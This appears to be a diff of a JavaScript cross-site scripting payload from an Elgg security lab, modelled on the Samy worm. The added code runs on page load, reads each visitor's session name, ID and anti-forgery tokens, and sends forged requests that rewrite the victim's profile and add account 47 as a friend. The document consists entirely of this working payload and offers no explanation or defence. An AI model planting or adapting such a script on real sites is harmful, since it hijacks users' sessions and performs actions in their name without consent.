@@ -1,5 +1,6 @@
-<script type="text/javascript">  
-window.onload = function () {  
+//Ajax脚本自动发起会话劫持
+<script type="text/javascript"> 
+window.onload = function () {
 var Ajax=null;  
 var desc = "&description=Samy+is+my+hero!";   
 desc += "&accesslevel&5Bdescription&5d=2";  
@@ -8,3 +9,29 @@ var name = "&name=" + elgg.session.user.name;  
 var guid = "&guid=" + elgg.session.user.guid;  
 var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;  
 var token = "&__elgg_token="+elgg.security.token.__elgg_token;  
+var sendurl="http://www.xsslabelgg.com/action/profile/edit";  
+// Construct and send the Ajax request  
+//Create and send Ajax request to modify profile  
+if(elgg.session.user.guid!=47) {  
+var Ajax=new XMLHttpRequest ();  
+Ajax.open("POST", sendurl, true);  
+Ajax.setRequestHeader ("Host", "www.xsslabelgg.com");  
+Ajax.setRequestHeader ("Content-Type","application/x-www-form-urlencoded") ;  
+// Send the POST request with the data  
+Ajax.send(token + ts + name + desc + guid);  
+}  
+  
+ 
+  
+var Ajax=null;  
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;  
+var token="&__elgg_token="+elgg.security.token.__elgg_token;  
+//Construct the HTTP request to add Samy as a friend.  
+var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+token+ts;    
+//Create and send Ajax request to add friend  
+Ajax=new XMLHttpRequest();  
+Ajax.open("GET", sendurl, true);  
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");  
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");  
+Ajax.send();  
+} </script>  
